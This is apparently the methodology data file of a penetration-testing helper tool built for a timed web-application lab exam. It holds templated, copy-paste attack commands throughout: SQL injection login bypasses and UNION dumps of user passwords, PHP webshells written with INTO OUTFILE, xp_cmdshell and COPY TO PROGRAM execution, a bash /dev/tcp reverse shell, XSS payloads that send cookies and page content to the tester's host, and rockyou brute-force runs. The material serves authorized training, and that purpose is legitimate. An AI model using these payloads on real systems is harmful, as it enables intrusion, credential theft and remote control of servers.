/* WARM — methodology data.
 * Edit this file to extend the tool: add phases, items, or commands.
 * Command strings use {variables} filled from the Scope panel at runtime.
 * Variables: {target_url} {target_host} {target_ip} {tester_ip} {tester_port} {wordlist} {ports} {cookie}
 *   {target_url}  full web app URL, e.g. http://app.target   (trailing slash is trimmed)
 *   {target_host} hostname parsed from {target_url}           (for filenames, Host:, hydra)
 *   {target_ip}   the IP                                      (for nmap / TLS / network tools)
 * A command may add `note:true` (guidance, not a shell command) so it renders without a Copy button.
 *
 * Style: manual-first. Each injection class leads with copy-paste, scoped payloads you can
 * paste straight into a browser / Repeater / curl. Automated tools stay as a last "triage"
 * line only — handy to map a target fast, but the finding is proven by hand.
 */
window.METHODOLOGY = {
  variables: [
    { key: "target_url",  label: "Target URLs (focus one)",  placeholder: "http://app.target/", scope: true, list: true },
    { key: "target_ip",   label: "Target IPs (focus one)",   placeholder: "10.10.10.10",        scope: true, list: true },
    { key: "tester_ip",   label: "Tester IP(s)", placeholder: "your attack box IP" },
    { key: "tester_port", label: "Tester port (listener)", placeholder: "9001", def: "9001" },
    { key: "wordlist",    label: "Wordlist",    placeholder: "/usr/share/seclists/...", def: "/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt" },
    { key: "ports",       label: "Ports",       placeholder: "80,443", def: "80,443" },
    { key: "cookie",      label: "Session cookie", placeholder: "name=value (optional)" },
    { key: "scope",       label: "Authorized scope (hosts/CIDRs)", placeholder: "one per line — warns if target is outside", multi: true, guard: true }
  ],

  phases: [
    {
      num: "00", id: "flow", title: "Game Plan & Proof",
      goal: "Five independent apps, two files each (local + proof). ~70% of the available points passes. Work one app to done, screenshot as you go, then move on.",
      items: [
        { label: "The objective (read this first)", sev: "crit",
          tell: "Exploit the web app to reach an authenticated ADMIN session, then read both files. No OS privilege escalation is required — a shell or file-read as the exploited process/user is enough for proof.",
          cmds: [
            { note: true, tool: "local.txt", cmd: "Shown inside the application's ADMIN section — so getting an admin session (auth bypass / IDOR / stored-XSS session theft / SQLi) usually hands it to you in the UI." },
            { note: true, tool: "proof.txt", cmd: "On the server filesystem: the root dir (/ on Linux, C:\\ on Windows) OR the home dir of the exploited process/user. Reachable via RCE shell or an arbitrary-file-read bug — no priv-esc needed." },
            { note: true, tool: "partial credit", cmd: "Points are per-objective and partial credit exists. A clean local.txt + a documented foothold on several targets beats one perfect box. Bank points early." }
          ] },
        { label: "Per-target loop",
          tell: "Don't rabbit-hole. Timebox recon, hit the high-yield bugs, and the moment you get an admin session / file-read / RCE, grab the files and screenshot.",
          cmds: [
            { note: true, tool: "loop", cmd: "1) Recon/map  2) Pick the loudest bug class for the stack  3) Get admin session OR file-read OR command-exec  4) Grab local.txt + proof.txt  5) Screenshot per the rules below  6) Next app." },
            { note: true, tool: "mindset", cmd: "Each app is usually ONE main chain. Framework + error style tells you which class. If ~30 min on a class yields nothing, switch classes, not targets — then come back. Full day + overnight: pace yourself, sleep." }
          ] },
        { label: "Emulated users (bots)", sev: "high",
          tell: "Some targets run a bot that visits pages on a timer — a stand-in admin. That makes STORED / BLIND XSS and CSRF live attacks: plant a payload where the bot will view it and steal its session or act as it.",
          cmds: [
            { note: true, tool: "angle", cmd: "Anything the bot reads (comments, support tickets, profile fields, filenames, logs, contact forms) is a delivery point. Start catch-server.py, plant a beacon, wait for the timed visit." },
            { tool: "steal-admin", cmd: "<script>new Image().src='http://{tester_ip}:{tester_port}/bot?'+document.cookie</script>" }
          ] },
        { label: "Proof screenshots — exact rules", sev: "crit",
          tell: "Miss the right screenshot and the target scores ZERO, no second chance. Match the capture to how you got the value.",
          cmds: [
            { note: true, tool: "via web UI", cmd: "If a proof value comes from the web UI: screenshot BOTH your web proxy (Burp) AND the browser showing the value, against the actual target machine." },
            { note: true, tool: "via shell", cmd: "If you got a shell: screenshot `type`/`cat` of the proof file from its ORIGINAL location (show the path), plus `hostname`/`ip a` (Linux) or `ipconfig`/`whoami` (Windows) in the same shot." },
            { note: true, tool: "both places", cmd: "Submit local.txt + proof.txt values in the control panel BEFORE time ends AND include the screenshots in the report. The panel won't tell you if they're right — so also prove them in the report." }
          ] },
        { label: "Report discipline", sev: "high",
          tell: "A reader must replay your attack step-by-step from the report alone. Every step, command, and console output. Scripts/PoCs go in the PDF as text.",
          cmds: [
            { note: true, tool: "per target", cmd: "Section per app: summary, steps to reproduce, each request/response, every payload IN FULL, the exploit script as text, and the two proof screenshots." },
            { tool: "export", cmd: "# the Export button drops a Markdown skeleton (phases, checks, notes) — paste it into your Word/LibreOffice template, then export the final report to PDF" }
          ] },
        { label: "Local helper tools (no AI, offline)", sev: "high",
          tell: "Deterministic scripts in scripts/ that capture evidence and turn access into points. Run per target so nothing is lost or re-derived under time pressure.",
          cmds: [
            { tool: "report-skel", cmd: "scripts/report-skel.sh {target_host} {target_url}   # per-target report section skeleton in loot/<t>/" },
            { tool: "logreq",      cmd: "scripts/logreq.sh {target_host} {target_url}/page?id=1   # curl wrapper: saves every request+response+timestamp as evidence" },
            { tool: "webshell",    cmd: "scripts/webshell.sh {target_url}/s.php 0 GET   # interactive prompt for a dropped cmd webshell (!proof, !rev IP PORT)" },
            { tool: "getproof",    cmd: "scripts/getproof.sh {target_host} {target_url}/s.php 0 GET   # runs id/hostname/local.txt/proof.txt, saves screenshot-ready" },
            { tool: "inject-probe",cmd: "scripts/inject-probe.sh {target_url} 'name=__I__&sort=id&order=asc' taco Tacos POST   # auto SQLi boundary + DBMS" }
          ] },
        { label: "Self-signed HTTPS",
          tell: "Some targets use self-signed certs. Proxy through Burp (it re-signs with its CA) or accept the cert in the browser, or curl will refuse.",
          cmds: [
            { tool: "curl-k", cmd: "curl -sk {target_url}/   # -k ignores the self-signed cert" },
            { note: true, tool: "burp", cmd: "Browsing through Burp replaces the self-signed cert with Burp's trusted CA, so the browser stops complaining." }
          ] }
      ]
    },

    {
      num: "01", id: "recon", title: "Recon & Mapping",
      goal: "Know every host, route, parameter, and technology before attacking anything.",
      items: [
        { label: "Fingerprint the stack",
          tell: "Headers, cookie names, error-page style tell you the framework — which decides which bugs matter. PHP→LFI/type-juggle; Java→XXE/deser/EL; Python/Ruby/Node→SSTI/proto.",
          cmds: [
            { tool: "target-recon", cmd: "scripts/target-recon.sh {target_url} {target_host}   # one-shot: fingerprint+discovery+NSE+JS harvest into loot/<t>/recon/" },
            { tool: "whatweb", cmd: "whatweb -a 3 {target_url}" },
            { tool: "httpx-toolkit", cmd: "httpx-toolkit -u {target_url} -title -tech-detect -status-code -web-server -ip" },
            { tool: "curl",    cmd: "curl -s -I {target_url}/" },
            { note: true, tool: "tell", cmd: "Cookie PHPSESSID→PHP · JSESSIONID→Java · .NET-… / viewstate→ASP.NET · connect.sid→Express/Node · session + Werkzeug→Flask/Python." }
          ] },
        { label: "Content discovery / forced browsing",
          tell: "Find /api, /admin, /private, backups, .git, .env, docs. Most labs are won here. Recurse, and fuzz extensions matching the stack.",
          cmds: [
            { tool: "ffuf",        cmd: "ffuf -u {target_url}/FUZZ -w {wordlist} -fc 404 -c -recursion -t 50 -e .php,.txt,.bak,.zip,.old,.inc" },
            { tool: "feroxbuster", cmd: "feroxbuster -u {target_url} -w {wordlist} -x php,txt,bak,zip,old,inc" },
            { tool: "curl",        cmd: "curl -s {target_url}/robots.txt; curl -s {target_url}/sitemap.xml" }
          ] },
        { label: "Read every client-side JS file", sev: "high",
          tell: "Static JS holds the API map: paths, exact field names, JSON vs form, hidden functions, debug flags, keys. Pull source maps if present.",
          cmds: [
            { tool: "katana",     cmd: "katana -u {target_url} -jc -d 3 -o katana-{target_host}.txt" },
            { tool: "gau",        cmd: "gau {target_host}" },
            { tool: "LinkFinder", cmd: "python3 linkfinder.py -i {target_url} -d -o cli" },
            { note: true, tool: "sourcemaps", cmd: "If a .js.map exists, reconstruct original source: npx source-map-explorer or shuji/unwebpack-sourcemap on app.js.map." }
          ] },
        { label: "Enumerate HTTP methods & params",
          tell: "The Allow header often leaks the real verb (e.g. POST-only /create) before any auth check. Hidden params drive mass-assignment.",
          cmds: [
            { tool: "curl", cmd: "curl -s -i -X OPTIONS {target_url}/api/" },
            { tool: "curl", cmd: "curl -s -o /dev/null -w 'GET %{http_code}\\n' {target_url}/api/admin/create" },
            { tool: "arjun", cmd: "arjun -u {target_url}/ -m GET" }
          ] },
        { label: "Port & service scan",
          tell: "Internal ports, non-web services, versions to pivot from.",
          cmds: [
            { tool: "nmap", cmd: "nmap -sV -sC -p {ports} {target_ip}" },
            { tool: "nmap", cmd: "nmap -p- --min-rate 2000 -oN nmap-full-{target_host}.txt {target_ip}" }
          ] },
        { label: "HTTP NSE scripts",
          tell: "nmap's http-* scripts map methods, config and low-hanging issues in one pass. http-methods leaks PUT/DELETE/WebDAV; http-cookie-flags checks Secure/HttpOnly/SameSite; http-cors shows ACAO/credentials; http-ls/http-enum surface listings and hidden paths.",
          cmds: [
            { tool: "nmap", cmd: "nmap -p {ports} --script=http-methods,http-ls,http-robots.txt,http-cookie-flags,http-cors --script-args http-methods.test-all=true -oN nmap-http-{target_host}.txt {target_ip}" },
            { tool: "nmap", cmd: "nmap -p {ports} --script=http-enum,http-headers,http-title,http-security-headers,http-auth,http-webdav-scan {target_ip}" },
            { tool: "nmap", cmd: "nmap -p {ports} --script 'http-* and not http-brute and not http-slowloris and not (dos or intrusive)' {target_ip}   # broad, safe http sweep" }
          ] },
        { label: "Proxy everything + triage scan",
          tell: "Route the browser through Burp from the start so every request is in history for Repeater. Use scanners only to map, never as proof.",
          cmds: [
            { note: true, tool: "Burp", cmd: "Set browser proxy to 127.0.0.1:8080, walk the whole app once, then work from Target > Site map / HTTP history in Repeater." },
            { tool: "nuclei", cmd: "nuclei -u {target_url} -t http/technologies/ -t http/exposures/   # map/triage only" }
          ] }
      ]
    },

    {
      num: "02", id: "intel", title: "Find Info in Files",
      goal: "Harvest every file the app serves or leaks, strip the library noise, then let grep read them all. The one JS file that maps the admin API, the .bak with the DB creds, the PDF with a username — this is how you find them without reading 50 files by hand.",
      items: [
        { label: "Harvest the files to disk", sev: "high",
          tell: "Collect from three sources: your content-discovery run, the pages the browser actually loads (catches hash-named bundles brute-force misses), and Burp history. Mirror to disk so grep can sweep them.",
          cmds: [
            { tool: "feroxbuster", cmd: "feroxbuster -u {target_url} -w {wordlist} -x js,php,txt,bak,old,zip,map,inc,env,json,xml --extract-links -o ferox-{target_host}.txt" },
            { tool: "pull-urls",   cmd: "grep -oiE 'https?://\\S+\\.(js|php|txt|bak|old|zip|map|inc|env|json|xml|pdf|docx?|xlsx?|csv|log|conf|ini|sql)\\b' ferox-{target_host}.txt | sort -u > files-urls.txt" },
            { tool: "scrape-src",  cmd: "for p in / /login /index.php /dashboard; do curl -sk {target_url}$p; done | grep -oiE 'src=\"[^\"]+\\.js[^\"]*\"' | sed -E 's/.*src=\"([^\"]+)\".*/\\1/' | sort -u" },
            { tool: "scrape-auth", cmd: "for p in / /dashboard /account; do curl -sk -H 'Cookie: {cookie}' {target_url}$p; done | grep -oiE 'src=\"[^\"]+\\.js[^\"]*\"' | sed -E 's/.*src=\"([^\"]+)\".*/\\1/' | sort -u" },
            { tool: "mirror",      cmd: "wget -q -x -nc -i files-urls.txt" },
            { note: true, tool: "Burp", cmd: "You're already proxying — browse logged-in AND out, then HTTP history > filter by .js/.pdf/etc > select all > right-click > Copy URLs. Captures exactly what the browser fetched, hashes and all." },
            { note: true, tool: "crawler alt", cmd: "katana pulls nothing on a JS-rendered app unless headless: katana -u {target_url} -headless -jc -d 5. Fallbacks: hakrawler < urls / gau {target_host} / gospider -s {target_url}." }
          ] },
        { label: "JavaScript — the API & admin map", sev: "crit",
          tell: "Admin logic rarely has an obvious filename. Delete the ~80% that's libraries, then rank the rest by signal. The winner has an admin/role word sitting next to an /api/ path.",
          cmds: [
            { tool: "drop-libs", cmd: "grep -rLiE 'jquery|bootstrap|angular|react|vue|lodash|moment|popper|polyfill|runtime|vendor|chunk-vendors' . --include=*.js" },
            { tool: "by-size",   cmd: "find . -name '*.js' -printf '%s\\t%p\\n' | sort -n   # huge = library; your app code is usually smaller / named app,main,bundle,chunk" },
            { tool: "rank-grep", cmd: "grep -rniE 'admin|manage|role|is_?admin|privile|superuser|/api/|endpoint|route|fetch\\(|axios|XMLHttpRequest|token|secret|debug|internal|hidden|disabled|TODO' . --include=*.js | grep -viE 'jquery|bootstrap|angular|vue|lodash|\\.min\\.js'" },
            { tool: "endpoints", cmd: "jsluice urls ./**/*.js 2>/dev/null | sort -u   # or: find . -name '*.js' -exec python3 /opt/LinkFinder/linkfinder.py -i {file} -o cli \\;" },
            { note: true, tool: "diff vs UI", cmd: "An endpoint that's in the JS but you've NEVER seen in Burp history = hidden/admin functionality. Curl each one you didn't already hit." },
            { tool: "beautify",  cmd: "js-beautify app.min.js | less   # or paste into Burp Decoder / an online beautifier" },
            { tool: "sourcemap", cmd: "curl -sk {target_url}/static/js/main.<hash>.js.map -o m.js.map && npx unwebpack-sourcemap m.js.map -o src/   # rebuilds original filenames/tree" },
            { tool: "admin-chunk", cmd: "grep -riE 'admin|manage|dashboard' . --include=*.js | grep -i chunk   # admin UI is often a lazily-loaded admin.<hash>.chunk.js" }
          ] },
        { label: "Server source & config (.php .inc .bak .env .git)", sev: "crit",
          tell: "Backups and exposed source hand you queries, routes, and creds directly. Read PHP without executing it via php://filter.",
          cmds: [
            { tool: "read-php",  cmd: "curl -sk '{target_url}/index.php?page=php://filter/convert.base64-encode/resource=config.php' | base64 -d" },
            { tool: "backups",   cmd: "ffuf -u {target_url}/FUZZ -w {wordlist} -e .bak,.old,.swp,.save,.zip,.tar.gz,.inc,~ -mc 200,206 -c" },
            { tool: "known",     cmd: "for f in .env .git/HEAD config.php wp-config.php web.config .htaccess docker-compose.yml backup.zip; do printf '%s ' \"$f\"; curl -sk -o /dev/null -w '%{http_code}\\n' {target_url}/$f; done" },
            { tool: "git-dump",  cmd: "git-dumper {target_url}/.git ./{target_host}-git" },
            { tool: "grep-src",  cmd: "grep -rniE 'password|passwd|secret|api[_-]?key|token|DB_|mysqli?_connect|SELECT .* FROM|is_admin|role' ./{target_host}-git" }
          ] },
        { label: "Documents & data (.pdf .docx .xlsx .csv .txt .log .xml)", sev: "high",
          tell: "Docs leak usernames, emails, internal hosts, software versions, and sometimes creds — in both content and metadata. Office files are just zips of XML.",
          cmds: [
            { tool: "pdftotext", cmd: "for f in *.pdf; do echo \"== $f ==\"; pdftotext \"$f\" - 2>/dev/null; done | grep -iE 'user|pass|@|http|internal|admin'" },
            { tool: "metadata",  cmd: "exiftool -a -u *.pdf *.docx *.xlsx *.jpg *.png 2>/dev/null | grep -iE 'Author|Creator|Producer|Last.?Modified.?By|Company|Software|Comment|User'" },
            { tool: "office=zip",cmd: "mkdir x && unzip -o report.docx -d x >/dev/null && grep -rniE 'password|@|https?://|user|internal' x" },
            { tool: "strings",   cmd: "strings -n 6 file.bin | grep -iE 'pass|key|token|https?://|BEGIN '" },
            { tool: "flat-files",cmd: "grep -rniE 'password|passwd|user(name)?|@|token|api[_-]?key|192\\.168|10\\.[0-9]|internal' . --include=*.txt --include=*.csv --include=*.log --include=*.conf --include=*.ini --include=*.sql" },
            { tool: "comments",  cmd: "curl -sk {target_url}/robots.txt; curl -sk {target_url}/sitemap.xml; curl -sk {target_url}/ | grep -oE '<!--.*-->'" }
          ] },
        { label: "Secrets sweep across everything", sev: "high",
          tell: "After mirroring, run one pass over the whole folder for credentials and keys — don't rely on eyeballing.",
          cmds: [
            { tool: "trufflehog", cmd: "trufflehog filesystem . --only-verified" },
            { tool: "gitleaks",   cmd: "gitleaks detect --source . -v --no-git" },
            { tool: "mega-grep",  cmd: "grep -rniE 'password|passwd|secret|api[_-]?key|authorization|bearer |BEGIN (RSA|OPENSSH|PRIVATE)|AKIA[0-9A-Z]{16}|eyJ[A-Za-z0-9_-]{10,}' . | grep -viE 'node_modules|\\.min\\.js|jquery'" },
            { tool: "name-hashes",cmd: "echo '<hash>' | nth   # name-that-hash: identify any hash you pulled, then crack with hashcat/john" },
            { note: true, tool: "one-shot", cmd: "scripts/files-recon.sh {target_url} '{cookie}' runs the whole pipeline: collect URLs, mirror, strip JS libs, ranked grep, endpoint list, and a secrets sweep into a report dir." }
          ] }
      ]
    },

    {
      num: "03", id: "auth", title: "Authentication & Session",
      goal: "Break the front door, or walk around it.",
      items: [
        { label: "Default & weak creds / brute", sev: "high",
          tell: "Try the obvious first (admin/admin, app-name, creds in JS/docs/.git). To brute, FIRST find the real failure string and enumerate users — a distinct 'no such user' vs 'wrong password' message is a user-enum oracle; brute only the valid names. Always pass -o so a backgrounded run's result isn't lost, and -f to stop on the first hit.",
          cmds: [
            { tool: "user-enum", cmd: "for u in admin root the-app-names; do printf '%s ' $u; curl -s {target_url}/login -d \"username=$u&password=x\" | grep -oE 'no such user|incorrect password|does not exist'; echo; done   # find the oracle, keep valid users" },
            { tool: "ffuf (fast)", cmd: "ffuf -u {target_url}/login -X POST -d 'username=bob&password=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -w /usr/share/wordlists/rockyou.txt -fr 'Incorrect Password' -fc 403,404,500 -ac -t 40 -o loot/{target_host}-brute.json -of json" },
            { tool: "hydra", cmd: "hydra -l bob -P /usr/share/wordlists/rockyou.txt -f -t 16 -o loot/{target_host}-hydra.txt {target_host} http-post-form '/login:username=^USER^&password=^PASS^:F=<failure string>'" },
            { note: true, tool: "speed", cmd: "PREFER ffuf for web-login brute — ~500 req/s vs hydra ~33 req/s (15x). `-fr` hides the failure string so the response WITHOUT it = the hit." },
            { note: true, tool: "false positives", cmd: "Absence-of-failure is fragile: if the box reverts/errors mid-run, its 404/500 also lacks the failure string and ffuf flags a bogus hit. Anchor on success instead — add -fc 403,404,500 and -ac (auto-calibrate), or better -mc 302 if success redirects. ALWAYS re-verify a hit by logging in manually; a long rockyou run can outlive an ephemeral lab." },
            { note: true, tool: "gotchas", cmd: "The failure string must appear ONLY on failure (a per-user 'Incorrect Password for User bob' is ideal). rockyou is deep AND slow at web speeds — background it, watch the -o file. Quote-stripped username/password = no SQLi, brute only." }
          ] },
        { label: "SQLi auth bypass", sev: "crit",
          tell: "Classic login-form break. Paste into the username (and/or password) field. Comment styles differ by DBMS.",
          cmds: [
            { tool: "payload", cmd: "' OR '1'='1'-- -" },
            { tool: "payload", cmd: "admin'-- -" },
            { tool: "payload", cmd: "admin'#" },
            { tool: "payload", cmd: "' OR 1=1 LIMIT 1;-- -" },
            { tool: "payload", cmd: "\") OR (\"1\"=\"1\"-- -" }
          ] },
        { label: "Type juggling / loose compare", sev: "high",
          tell: "PHP == treats '0e123'=='0e456' (both 0) and magic hashes. JSON into a == check: send a number or true where a string is expected.",
          cmds: [
            { tool: "payload", cmd: "{\"password\":0}   # 0 == \"any-string\" is true in loose PHP compares" },
            { tool: "payload", cmd: "{\"password\":true}" },
            { note: true, tool: "magic hash", cmd: "If a hash is compared with ==, a '0e…'-prefixed all-digit hash collides with another. See scripts/payloads/magic-hashes.txt — try value 240610708 (md5→0e…), QNKCDZO, etc." },
            { tool: "payload", cmd: "password[]=1   # forcing an array can make strcmp()/hash return NULL == 0" }
          ] },
        { label: "Password reset / forgot flow", sev: "high",
          tell: "Guessable tokens, token not bound to user, host-header poisoning in reset links, response leaks the token.",
          cmds: [
            { tool: "curl", cmd: "curl -s {target_url}/api/user/forgotPassword -d 'email=victim@test.net' -H 'Host: {tester_ip}'" },
            { tool: "curl", cmd: "curl -s {target_url}/reset -d 'email=victim@test.net' -H 'X-Forwarded-Host: {tester_ip}'" }
          ] },
        { label: "JWT handling", sev: "high",
          tell: "alg:none, weak HMAC secret (crack offline), RS256->HS256 confusion (sign with the public key as HMAC secret), kid path traversal.",
          cmds: [
            { tool: "jwt_tool", cmd: "jwt_tool <JWT> -M at -t {target_url}/api/me" },
            { tool: "jwt_tool", cmd: "jwt_tool <JWT> -X a    # alg:none" },
            { tool: "hashcat",  cmd: "hashcat -a 0 -m 16500 jwt.txt {wordlist}" }
          ] },
        { label: "Session management",
          tell: "Entropy/signing, fixation, cookie flags, does logout + password change invalidate.",
          cmds: [ { note: true, tool: "Burp", cmd: "Burp Sequencer on the session cookie; check Secure/HttpOnly/SameSite flags and server-side invalidation. Flask 'session=' values are signed — try flask-unsign to forge if the secret is weak." } ] }
      ]
    },

    {
      num: "04", id: "access", title: "Access Control & Privilege Escalation",
      goal: "Right session, wrong permissions — the most common real finding.",
      items: [
        { label: "IDOR / BOLA", sev: "crit",
          tell: "Swap id/uuid/filename across users; test every object reference with a lower-priv account. Increment, decrement, try other users' IDs.",
          cmds: [
            { tool: "ffuf", cmd: "ffuf -u {target_url}/api/user/FUZZ -w ids.txt -H 'Cookie: {cookie}' -mc 200" },
            { tool: "curl", cmd: "for i in $(seq 1 50); do echo -n \"$i \"; curl -s -o /dev/null -w '%{http_code}\\n' {target_url}/api/user/$i -H 'Cookie: {cookie}'; done" }
          ] },
        { label: "Trust-based bypass", sev: "high",
          tell: "Routes that trust source IP or headers. If an internal API trusts loopback, SSRF makes you loopback.",
          cmds: [
            { tool: "curl", cmd: "curl -s {target_url}/admin -H 'X-Forwarded-For: 127.0.0.1'" },
            { tool: "curl", cmd: "curl -s {target_url}/ -H 'X-Original-URL: /admin'" },
            { tool: "curl", cmd: "curl -s {target_url}/admin -H 'X-Custom-IP-Authorization: 127.0.0.1'" }
          ] },
        { label: "Function-level access control",
          tell: "Hit admin endpoints directly with a normal session; replay an admin action captured from JS/docs.",
          cmds: [ { note: true, tool: "Burp + Autorize", cmd: "Load Autorize with a low-priv cookie, browse as admin, review red/green enforcement." } ] }
      ]
    },

    {
      num: "05", id: "sqli", title: "SQL Injection (manual)",
      goal: "Prove it by hand: detect → identify DBMS → UNION or blind → read data / files.",
      items: [
        { label: "Detect", sev: "crit",
          tell: "Break the quote, watch for an error or a behaviour change. A single quote that errors and a balanced pair that doesn't = injectable.",
          cmds: [
            { tool: "probe", cmd: "'" },
            { tool: "probe", cmd: "1' AND '1'='1   (true)   vs   1' AND '1'='2   (false)" },
            { tool: "curl",  cmd: "curl -s \"{target_url}/page?id=1'\"   # look for SQL error text / 500" }
          ] },
        { label: "Auto-find boundary + DBMS (local, no AI)", sev: "high",
          tell: "Mechanically cycles break-out boundaries (', '), ')), \", LIKE %, numeric) and comment styles, finds the one giving a stable TRUE vs FALSE, then fingerprints the engine with one engine-only probe each. Pure local curl — no third-party calls, safe for tool-restricted engagements. Feed it a base value that returns a row and a marker string from a normal response.",
          cmds: [
            { tool: "inject-probe", cmd: "scripts/inject-probe.sh {target_url} 'name=__I__&sort=id&order=asc' taco Tacos POST" },
            { tool: "inject-probe", cmd: "scripts/inject-probe.sh '{target_url}/page?id=__I__' '' 1 SomeRowText GET" },
            { note: true, tool: "then", cmd: "It prints the confirmed boundary (e.g. %') + comment) and the matched DBMS, then the ready sqlmap line (--dbms=X --level 3 --risk 3 --technique=BEU --threads 10) or a hand UNION using that boundary." },
            { tool: "dbms-id", cmd: "scripts/dbms-id.sh {target_url} 'db=mysql&name=__P__&sort=id&order=asc' Tacos \"%')\" '-- -' POST   # when an app param selects the backend: which value routes to which engine" }
          ] },
        { label: "Identify the DBMS",
          tell: "Pick payloads by engine. Comment styles: MySQL `-- -` or `#`, MSSQL/Oracle/Postgres `-- -`. String concat differs.",
          cmds: [
            { tool: "mysql",    cmd: "' AND 1=CONVERT(int,@@version)-- -   /  ' UNION SELECT @@version-- -" },
            { tool: "mssql",    cmd: "' AND 1=@@version-- -   (error leaks 'Microsoft SQL Server')" },
            { tool: "postgres", cmd: "' AND 1=CAST(version() AS int)-- -" },
            { tool: "oracle",   cmd: "' AND 1=(SELECT banner FROM v$version WHERE rownum=1)-- -" },
            { tool: "sqlite",   cmd: "' AND 1=sqlite_version()-- -" }
          ] },
        { label: "UNION: column count + reflected column", sev: "crit",
          tell: "ORDER BY until it errors = column count. Then UNION with a marker to find which column prints. Oracle UNIONs need FROM dual.",
          cmds: [
            { tool: "step1", cmd: "' ORDER BY 1-- -   (increment until error → N-1 columns)" },
            { tool: "step2", cmd: "' UNION SELECT NULL,NULL,NULL-- -   (match count; swap a NULL for 'ABC' to find the printed column)" },
            { tool: "mysql", cmd: "' UNION SELECT 1,2,group_concat(table_name),4 FROM information_schema.tables WHERE table_schema=database()-- -" },
            { tool: "mysql", cmd: "' UNION SELECT 1,2,group_concat(column_name),4 FROM information_schema.columns WHERE table_name='users'-- -" },
            { tool: "mysql", cmd: "' UNION SELECT 1,2,group_concat(username,0x3a,password),4 FROM users-- -" },
            { note: true, tool: "helper", cmd: "scripts/sqli-union.sh finds the column count and the reflected column for you over curl." }
          ] },
        { label: "Error-based",
          tell: "When data isn't reflected but errors are verbose.",
          cmds: [
            { tool: "mysql", cmd: "' AND extractvalue(1,concat(0x7e,(SELECT @@version)))-- -" },
            { tool: "mysql", cmd: "' AND updatexml(1,concat(0x7e,(SELECT user())),1)-- -" },
            { tool: "mssql", cmd: "' AND 1=CONVERT(int,(SELECT @@version))-- -" }
          ] },
        { label: "Blind: boolean & time",
          tell: "No output, no error. Infer bit by bit. Time payloads confirm a fully blind injection.",
          cmds: [
            { tool: "boolean", cmd: "' AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a'-- -" },
            { tool: "mysql-time", cmd: "' AND IF(1=1,SLEEP(5),0)-- -" },
            { tool: "mssql-time", cmd: "'; IF(1=1) WAITFOR DELAY '0:0:5'-- -" },
            { tool: "postgres-time", cmd: "' AND 1=(SELECT 1 FROM pg_sleep(5))-- -" },
            { note: true, tool: "triage", cmd: "To speed a confirmed-blind extraction, sqlmap is the fast path — but reproduce/screenshot the key payloads by hand for the write-up:  sqlmap -u '{target_url}/page?id=1' --batch --level 2 --risk 2 --technique=BT" }
          ] },
        { label: "Read / write files via SQLi", sev: "crit",
          tell: "Often the straightest road to a proof file or a webshell.",
          cmds: [
            { tool: "mysql-read",  cmd: "' UNION SELECT 1,LOAD_FILE('/etc/passwd'),3-- -" },
            { tool: "mysql-write", cmd: "' UNION SELECT 1,'<?php system($_GET[0]);?>',3 INTO OUTFILE '/var/www/html/s.php'-- -" },
            { tool: "mssql-rce",   cmd: "'; EXEC xp_cmdshell 'whoami'-- -   (enable: EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE)" },
            { tool: "postgres-rce",cmd: "'; COPY (SELECT '') TO PROGRAM 'id';-- -" }
          ] },
        { label: "SQLi → OUTFILE webshell", sev: "crit",
          tell: "MySQL can WRITE files with INTO OUTFILE. Write a tiny PHP cmd-shell into the webroot, then call it. Needs all three: FILE priv, empty @@secure_file_priv, and a known writable webroot (error messages leak the path). Match your UNION's column count; put the PHP in one column, filler in the rest.",
          cmds: [
            { note: true, tool: "0. preconditions", cmd: "' UNION SELECT current_user(),@@secure_file_priv-- -   — empty secure_file_priv = write anywhere. FILE priv: ' UNION SELECT grantee,privilege_type FROM information_schema.user_privileges WHERE privilege_type='FILE'-- -" },
            { tool: "1. write (string ctx)", cmd: "' UNION SELECT '<?php system($_GET[0]); ?>','' INTO OUTFILE '/var/www/html/s.php'-- -" },
            { tool: "1. write (numeric ctx)", cmd: "0 UNION SELECT '<?php system($_GET[0]); ?>','' INTO OUTFILE '/var/www/html/s.php'-- -" },
            { tool: "2. run — whoami",   cmd: "curl '{target_url}/s.php?0=id'" },
            { tool: "2. run — read proof", cmd: "curl '{target_url}/s.php?0=cat%20/proof.txt'" },
            { tool: "3. revshell",       cmd: "curl '{target_url}/s.php' --data-urlencode '0=bash -c \"bash -i >& /dev/tcp/{tester_ip}/{tester_port} 0>&1\"'" },
            { note: true, tool: "notes", cmd: "The URL param (?0=) is the command — change it per call, no re-write. OUTFILE writes every column tab-separated (PHP ignores the trailing tab); INTO DUMPFILE writes one row raw if you need a clean file. Files served path may differ from disk path (e.g. /var/www/html → /app/). Delete the shell or revert the box when done." }
          ] }
      ]
    },

    {
      num: "06", id: "xss", title: "Cross-Site Scripting",
      goal: "Find the context, break out of it, then do something with it.",
      items: [
        { label: "Find the context", sev: "high",
          tell: "Inject a unique marker, find it in the response, and see what encodes it — HTML body, attribute, JS string, URL, or DOM sink.",
          cmds: [
            { tool: "probe", cmd: "wzq'\"><svg/onload=confirm(1)>wzq" },
            { tool: "curl",  cmd: "curl -s '{target_url}/search?q=wzq__marker__' | grep -n wzq__marker__" }
          ] },
        { label: "Context breakout payloads",
          tell: "Pick by where your marker landed.",
          cmds: [
            { tool: "html-body", cmd: "<img src=x onerror=alert(document.domain)>" },
            { tool: "attribute", cmd: "\"><svg onload=alert(document.domain)>" },
            { tool: "js-string", cmd: "';alert(document.domain)//" },
            { tool: "js-template", cmd: "${alert(document.domain)}" },
            { tool: "href",      cmd: "javascript:alert(document.domain)" },
            { tool: "filter-bypass", cmd: "<svg/onload=alert`1`>  ·  <img src=x onerror=\\u0061lert(1)>  ·  oNeRrOr" }
          ] },
        { label: "Steal a session (reflected/stored)", sev: "crit",
          tell: "If HttpOnly isn't set, exfil the cookie to your catcher. Otherwise exfil CSRF tokens / page content / do an action as the victim.",
          cmds: [
            { tool: "cookie-steal", cmd: "<script>new Image().src='http://{tester_ip}:{tester_port}/c?'+document.cookie</script>" },
            { tool: "fetch-exfil",  cmd: "<script>fetch('http://{tester_ip}:{tester_port}/x?d='+btoa(document.body.innerHTML))</script>" },
            { tool: "force-action", cmd: "<script>fetch('{target_url}/api/user/update',{method:'POST',credentials:'include',headers:{'Content-Type':'application/json'},body:'{\"role\":\"admin\"}'})</script>" },
            { note: true, tool: "catcher", cmd: "Run scripts/catch-server.py {tester_port} to log every callback (cookies/data) with a timestamp." }
          ] },
        { label: "Blind / stored XSS",
